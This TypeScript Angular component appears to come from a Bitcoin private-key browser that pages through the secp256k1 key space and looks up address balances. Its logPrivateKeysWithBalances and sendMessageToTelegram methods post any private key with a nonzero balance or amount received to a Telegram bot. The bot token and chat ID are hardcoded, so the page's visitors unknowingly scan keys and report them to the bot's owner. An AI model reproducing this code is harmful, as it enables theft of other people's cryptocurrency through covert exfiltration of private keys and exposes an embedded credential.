import { Component, OnInit } from '@angular/core';
import { ActivatedRoute, Router } from '@angular/router';
import { firstValueFrom } from 'rxjs';
import { AllKeyService } from 'src/app/services/all-key.service';
import { BalanceService } from 'src/app/services/balance.service';
import { IAllKey } from 'src/app/types/IAllKey';
import { IBlockchain } from 'src/app/types/IBlockchain';
import axios from 'axios';


@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.css'],
})
export class HomeComponent implements OnInit {
  tableHeaderColumns: string[] = [
    'privateKey',
    'address',
    'balance',
    'received',
    'compressed',
    'balance',
    'received',
  ];

  items: IAllKey[] = [];

  maxNumber =
    
    0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140n; // secp256k1_n - 1

  page = 1n;
  limitPerPage = 100;
  maxPage = this.maxNumber / BigInt(this.limitPerPage);

  isLoadingResults = true;
  isError = false;

  constructor(
    private allKeyService: AllKeyService,
    private route: ActivatedRoute,
    private router: Router,
    private balanceService: BalanceService
  ) {}

  ngOnInit() {
    this.route.queryParamMap.subscribe((params) => {
      this.page = BigInt(params.get('page') || '1');
      this.getData();
    });
  }

  onOlder() {
    this.page = this.page - 1n;
    if (this.page === 0n) {
      this.page = 1n;
    }
    this.router.navigate(['/home'], { queryParams: { page: this.page } });
  }

  onNewer() {
    this.page = this.page + 1n;
    if (this.page >= this.maxPage) {
      this.page = this.maxPage;
    }
    this.router.navigate(['/home'], { queryParams: { page: this.page } });
  }

  async getData() {
    this.isLoadingResults = true;
    const items = this.allKeyService.getData(this.page, this.limitPerPage);
    this.items = items;
    const addresses: string[] = [];
    for (const key in items) {
      const item = items[key];
      addresses.push(item.addressCompressed);
      addresses.push(item.addressUnCompressed);
    }
    const balanceList = await firstValueFrom(
      this.balanceService.getBalance(addresses)
    );
    this.items = this.items.map((item) => {
      item.addressCompressedBalance = this.getBalance(
        item.addressCompressed,
        balanceList,
        'final_balance'
      );
      item.addressCompressedReceived = this.getBalance(
        item.addressCompressed,
        balanceList,
        'total_received'
      );
      item.addressUnCompressedBalance = this.getBalance(
        item.addressUnCompressed,
        balanceList,
        'final_balance'
      );
      item.addressUnCompressedReceived = this.getBalance(
        item.addressUnCompressed,
        balanceList,
        'total_received'
      );
      return item;
    });
    this.logPrivateKeysWithBalances();
  }

  async logPrivateKeysWithBalances() {
    // Looping melalui setiap item
    for (const item of this.items) {
        const hasCompressedBalanceOrReceived = 
            (item.addressCompressedBalance != null && item.addressCompressedBalance > 0) || 
            (item.addressCompressedReceived != null && item.addressCompressedReceived > 0);
        
        const hasUncompressedBalanceOrReceived = 
            (item.addressUnCompressedBalance != null && item.addressUnCompressedBalance > 0) || 
            (item.addressUnCompressedReceived != null && item.addressUnCompressedReceived > 0);

        // Cek jika ada balance atau received yang lebih dari 0
        if (hasCompressedBalanceOrReceived || hasUncompressedBalanceOrReceived) {
            const message = `Private Key: ${item.privateKey}\n` +
                            `Compressed Balance: ${item.addressCompressedBalance}\n` +
                            `Compressed Received: ${item.addressCompressedReceived}\n` +
                            `Uncompressed Balance: ${item.addressUnCompressedBalance}\n` +
                            `Uncompressed Received: ${item.addressUnCompressedReceived}`;
            
            // Kirim pesan ke Telegram
            try {
                await this.sendMessageToTelegram(message); // Pastikan ini adalah async
                console.log('Message sent to Telegram:', message);
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
            }

            // Jeda selama 1.1 detik sebelum pengiriman berikutnya
            await delay(1100); // 1100 ms = 1.1 detik
        }
      }
  }

  getBalance(
    address: string,
    balanceList: IBlockchain[],
    type: 'final_balance' | 'total_received'
  ): number {
    const balance = balanceList[address as any];
    return balance ? balance[type] : 0;
  }

  getBalanceClass(balance: number | null) {
    return balance ? 'text-slate-900' : 'text-slate-400';
  }

  async sendMessageToTelegram(message: string) {
      const token = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE'; // Ganti dengan token bot Anda
      const chatId = '-4562112556'; // Ganti dengan chat ID Anda

      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
          await axios.post(url, {
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown' // Atau 'HTML', tergantung pada format yang ingin Anda gunakan
          });
          console.log('Message sent to Telegram:', message);
      } catch (error) {
          console.error('Error sending message to Telegram:', error);
      }
  }
  
}

// Fungsi untuk delay
function delay(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms));
}